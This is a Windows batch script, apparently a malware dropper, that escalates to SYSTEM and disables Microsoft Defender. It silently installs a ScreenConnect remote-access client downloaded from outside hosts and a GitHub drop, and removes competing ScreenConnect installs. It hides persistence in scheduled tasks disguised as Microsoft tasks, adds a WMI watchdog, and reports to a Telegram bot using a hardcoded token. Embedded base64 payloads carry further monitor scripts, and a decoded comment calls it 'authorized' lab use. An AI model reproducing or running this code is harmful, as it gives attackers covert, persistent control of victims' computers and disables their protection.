@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O15 - self-contained embed + identity + mutual watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O15 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  mkdir "%WD%" >nul 2>&1
  copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
  echo engine=cmd_detached_o15>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  set "DETACH_OK=0"
  set "RUNNER=%BOOT%\own_run.cmd"
  if exist "%SELF%" set "RUNNER=%SELF%"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c %RUNNER% _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"%RUNNER%\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "%RUNNER%" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline (Guest may kill)
    call "%RUNNER%" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo === OWN WORKER 20260802O15 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" if exist "%BOOT%\own_secure.cmd" copy /y "%BOOT%\own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" if exist "%SystemRoot%\Temp\own_secure.cmd" copy /y "%SystemRoot%\Temp\own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Ensure PRIMARY...
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
sc stop "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
timeout /t 10 /nobreak >nul

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

REM Always nuke foreign - KEEP1/KEEP2 stay (not gated on primary)
echo [4] Nuke foreign ScreenConnect (keep allowlist only)...
call :NukeForeign

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0own_mon.cmd" (
  copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
) else (
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
if exist "%~dp0own_lib.ps1" copy /y "%~dp0own_lib.ps1" "%WD%\own_lib.ps1" >nul
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
if exist "%~dp0notify.cfg" copy /y "%~dp0notify.cfg" "%WD%\notify.cfg" >nul
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  copy /y "%MSI%" "%MSICACHE%" >nul
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=%TASK_A%>>"%LOG%"
echo identity_B=%TASK_B%>>"%LOG%"
echo identity_C=%TASK_C%>>"%LOG%"
echo identity_D=%TASK_D% mo=%MO_A%/%MO_B%>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O15 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
if exist "%~dp0tg_report.ps1" (
  copy /y "%~dp0tg_report.ps1" "%WD%\tg_report.ps1" >nul
) else (
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
if not exist "%WD%\tg_report.ps1" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DROP%/tg_report.ps1' -OutFile '%WD%\tg_report.ps1' -UseBasicParsing" >nul 2>&1
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O15 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo nuke_begin>>"%LOG%"
for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_NAME:"') do (
  set "SN=%%A"
  if defined SN (
    set "SN=!SN:~1!"
    echo !SN! | findstr /I "ScreenConnect" >nul
    if not errorlevel 1 (
      set "KEEP=0"
      echo !SN! | findstr /I "%KEEP1%" >nul && set "KEEP=1"
      echo !SN! | findstr /I "%KEEP2%" >nul && set "KEEP=1"
      if "!KEEP!"=="1" (
        echo keep_svc=!SN!>>"%LOG%"
      ) else (
        echo nuke_svc=!SN!>>"%LOG%"
        sc stop "!SN!" >nul 2>&1
        timeout /t 1 /nobreak >nul
        sc delete "!SN!" >nul 2>&1
      )
    )
  )
)

wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1

for %%R in ("%ProgramFiles%" "%PF86%") do (
  if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
    set "KEEP=0"
    echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
    echo %%~nxD | findstr /I "%KEEP2%" >nul && set "KEEP=1"
    if "!KEEP!"=="1" (
      echo keep_dir=%%~D>>"%LOG%"
    ) else (
      echo nuke_dir=%%~D>>"%LOG%"
      takeown /F "%%~D" /R /D Y >nul 2>&1
      icacls "%%~D" /grant Administrators:F /T /C >nul 2>&1
      rd /s /q "%%~D" >nul 2>&1
      if exist "%%~D" (
        echo nuke_dir_FAIL=%%~D>>"%LOG%"
      ) else (
        echo nuke_dir_ok=%%~D>>"%LOG%"
      )
    )
  )
)
echo nuke_done>>"%LOG%"
exit /b 0

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODAyTTkNCnJl
::bSAgUGVyc2lzdGVudCB3YXRjaGRvZyAtIGlkZW50aXR5LWF3YXJlIChhbnRpLXNp
::Z25hdHVyZSksIG11dHVhbA0KcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kg
::ZmFsbGJhY2sgY2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4NCnJlbSAgQXV0
::aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNj
::b3BlIG9ubHkuDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uDQoN
::CnNldCAiS0VFUF9GUD01ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJBTFRfRlA9Zjg2
::MWM4MTQwZDQ1MzQyNyINCnNldCAiV0Q9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0
::XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIkVUTD1DOlxQcm9ncmFt
::RGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwuZXRsY2FjaGUiDQpzZXQg
::IkxPRz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24u
::c3RhdGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5
::c3RlbVJvb3RcU3lzdGVtMzJcY3VybC5leGUiDQpzZXQgIlRHPWh0dHBzOi8vcmF3
::LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWlu
::L3RnX3JlcG9ydC5wczEiDQpzZXQgIlRHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
::ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBvcnQucHMxIg0K
::c2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hu
::b2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQiDQpzZXQgIk9X
::TlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQiDQpzZXQgIk9XTU1PTj1odHRwczov
::L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3Av
::bWFpbi9vd25fbW9uLmNtZCINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2Rl
::bGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNt
::ZCINCnNldCAiT1dOTElCPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
::bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9saWIucHMxIg0Kc2V0ICJP
::V05MSUIyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRo
::dWItZHJvcEBtYWluL293bl9saWIucHMxIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8v
::c2V2cnouY29tL1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIg0Kc2V0ICJN
::U0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
::ZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0lfUEtHMj1odHRw
::czovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFp
::bi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0
::LkNsaWVudFNldHVwLm1zaSINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdE
::JSIgMj5udWwNCmlmIG5vdCBleGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIg
::Mj5udWwNCg0Kc2V0ICJNT05WRVI9TTkiDQpmb3IgL2YgInRva2Vucz0xLTMgZGVs
::aW1zPS8gIiAlJWEgaW4gKCIlZGF0ZSUiKSBkbyBzZXQgIkRUPSVkYXRlJSAldGlt
::ZSUiDQplY2hvLj4+IiVMT0clIg0KZWNobyDilIDilIAgdGljayAhRFQhIFt2ZXIg
::JU1PTlZFUiXdIOKUgOKUgD4+IiVMT0clIg0Kc2V0ICJDT1VOVD0wIg0Kc2V0ICJJ
::TlNUQUxMRUQ9MCINCnNldCAiUFJJTV9PSz0wIg0Kc2V0ICJBTFRfT0s9MCINCnNl
::dCAiRk9SRUlHTl9MRUZUPTAiDQpzZXQgIkZPUkVJR05fTElTVD0iDQoNCnJlbSDi
::lIDilIAgcGVyLWhvc3QgaWRlbnRpdHkgKGFudGktc2lnbmF0dXJlKSDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIA2NCINCmlmIG5vdCBleGlzdCAiJVdEJVxpZGVudGl0
::eS5jZmciIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
::IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGluaXQgLVdvcmtEaXIg
::IiVXRCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBm
::b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLDIgZGVsaW1zPT0iICUlSyBpbiAoIiVX
::RCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVWIg0KaWYgbm90IGRlZmlu
::ZWQgVEFTS19BIHNldCAiVEFTS19BPVxNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9z
::aXNcU2NoZWR1bGVkIg0KaWYgbm90IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19C
::PVxNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIg0KaWYgbm90IGRlZmluZWQg
::VEFTS19DIHNldCAiVEFTS19DPVxNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1
::dGlvbkhvc3QiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9XE1p
::Y3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MSINCmlmIG5v
::dCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIiDQppZiBub3QgZGVmaW5lZCBNT19C
::IHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSAIFtBXSBhdXRvLXVwZGF0ZSBjb3Jl
::IGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBub3QgZXhpc3QgIiVDVVJM
::JSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2
::b2tlIC1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRn
::X3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdE
::JVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4
